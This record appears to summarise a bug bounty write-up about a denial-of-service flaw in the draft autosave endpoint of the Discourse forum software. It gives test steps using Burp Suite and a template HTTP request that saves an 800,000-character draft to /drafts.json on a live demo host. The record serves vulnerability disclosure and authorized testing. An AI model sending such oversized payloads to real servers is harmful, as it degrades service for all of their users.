---
id: 2fee7a76ee1a
title: "$1,024 for making Discourse choke on one really long draft"
source_url: https://pawanjswal.medium.com/1-024-for-making-discourse-choke-on-one-really-long-draft-8f9464a6bd28
author: "Pawan Jaiswal"
publication_date: 2026-08-20
category: denial-of-service
category_label: "Denial of Service"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "hacking"
  - "web-security"
  - "infosec"
  - "bug-bounty"
  - "cybersecurity"
tools:
  - "Burp Suite"
quick_test: "Test draft or autosave endpoints for input size limits, especially if the main post endpoint has restrictions."
---

## Use case

The Discourse platform's draft feature was vulnerable to denial of service due to a lack of input size validation, allowing an attacker to save excessively large drafts, which degraded server performance for all users.

## Steps to test

1. Log in to try.discourse.org with a regular account.
2. Intercept a POST request to /drafts.json using Burp Suite.
3. Replace the draft content with a payload of approximately 800,000 characters.
4. Send the request and observe the 502 Bad Gateway response.
5. Check the drafts list or send a GET request to /drafts.json to confirm the oversized draft was saved.

## Commands

```text
POST /drafts.json HTTP/1.1
Host: try.discourse.org
Content-Type: application/json
Content-Length: [length_of_payload]
{"draft":"[800,000 characters of text]"}
```

## Source

- Author: Pawan Jaiswal
- Writeup: https://pawanjswal.medium.com/1-024-for-making-discourse-choke-on-one-really-long-draft-8f9464a6bd28

_For authorized testing only. Credit the original author._
